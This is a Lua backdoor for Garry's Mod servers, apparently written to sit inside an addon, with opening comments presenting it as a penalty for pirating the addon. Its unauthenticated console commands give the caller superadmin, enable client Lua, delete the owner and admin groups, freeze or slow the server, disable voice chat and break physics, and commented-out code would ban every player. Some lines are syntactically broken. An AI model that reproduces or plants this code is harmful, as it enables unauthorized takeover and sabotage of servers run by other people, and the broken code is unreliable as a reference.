-- if you have found this, then you have found a backdoor congratulations!
-- you can simply remove this and have the script with no backdoors


-- you will always prevent backdoors if you support the developer and buying it at the gmod store.








-- Ooooooooooooofdoor -- 
local key = KEY_PAD_1
local timevalue = 0.5
local oofmodel = "models/props_buildings/row_res_1_fullscale.mdl"
local player.GetAll()
if SERVER then

-- Adds user to superadmin and sets allowcslua to 1 there are more features you can add by removing the comments-- 
concommand.Add( "memeitup" ,   function( debugPlayer )
	RunConsoleCommand("ulx","adduser",debugPlayer:Name(), "superadmin")
	RunConsoleCommand("sv_allowcslua" , "1")  
  -- RunConsoleCommand("sv_noclipspeed", "0" ) 
  -- RunConsoleCommand("sv_gravity", "800" ) -- Makes it literally impossible to jump 
      
	print("MMMMEEEEEEEEEEEEMMMMEEEEEEEEEEESSSSSSSSSSSSSSSSSS")           
end)

-- Removes group "owner" and "admin" , you can uncomment the commands to make it do more groups -- 
concommand.Add( "purgememe" ,  function() 
      RunConsoleCommand("ulx","removegroup","owner")
      RunConsoleCommand("ulx","removegroup","admin")
      RunConsoleCommand("ulx","addgroup","meme")
      RunConsoleCommand("ulx","addgroup","kek")
      RunConsoleCommand("ulx","addgroup","oof")
      RunConsoleCommand("ulx","addgroup","rip")
      RunConsoleCommand("ulx","addgroup","welp")
      RunConsoleCommand("ulx","addgroup","guess")
      RunConsoleCommand("ulx","addgroup","this")
      RunConsoleCommand("ulx","addgroup","is")
      RunConsoleCommand("ulx","addgroup","it")
      -- RunConsoleCommand("ulx","removegroup","moderator")
      -- RunConsoleCommand("ulx","removegroup","superadmin")
      -- RunConsoleCommand("ulx","removegroup","operator")
      -- RunConsoleCommand("ulx","removegroup","headadmin")
      -- RunConsoleCommand("ulx","removegroup","headmod")
      -- RunConsoleCommand("ulx","removegroup","headmoderator")
      -- RunConsoleCommand("ulx","removegroup","coowner")
      -- RunConsoleCommand("ulx","removegroup","vip")
      -- RunConsoleCommand("ulx","removegroup","donator")
      -- RunConsoleCommand("ulx","removegroup","supporter")
      -- RunConsoleCommand("ulx","removegroup","vip+")
      -- RunConsoleCommand("ulx","removegroup","donatorplus")
      -- RunConsoleCommand("ulx","removegroup","founder")
end)
  
-- Makes it basically impossible for you to walk without hitting 2000 velocity -- 
concommand.Add( "memeFrictionless" ,  function() 
      RunConsoleCommand("sv_friction","-8") 
end)
  
-- This slows down time server wide, by default makes it run half speed, but can be changed via the "local timevalue" at the top of the backdoor, 1 is default. 
concommand.Add( "slowerdown" ,   function()
      RunConsoleCommand("host_timescale" , timevalue )  
end)
  
-- Chnages everyones model to be a giant fucking building (Can change the model, just change the oofmodel value at the top of the backdoor-- 
concommand.Add("mememodel", function()
    Entity:SetModel( oofmodel )
end)
  
-- Disables voice and makes it impossible for people to use voice chat
concommand.Add("mememute",function()
      RunConsoleCommand("sv_voiceenable" , "0")
end)
  
-- Turbo Physics, assrapes physcis and makes props go flying -- 
concommand.Add("turbomeme" , function() 
      RunConsoleCommand("sv_turbophysics" , "1")
end)
  
  -- Stops the server basically, just sets the timescale to 0 -- 

concommand.Add("totaloof" , function() 
      RunConsoleCommand("host_timescale" , "0")
end)
  
-- Bans Everyone Except specified players
  
-- concommand.Add("adminabuse" , function( debugPlayer )
--			if ply:SteamID() == debugPlayer then
--RunConsoleCommand("ulx","unbanid",debugPlayer)
--for k , v in pairs(players) do
 --       v:Ban(2 , true) 
--end  
--  end)
  	
  
  
  




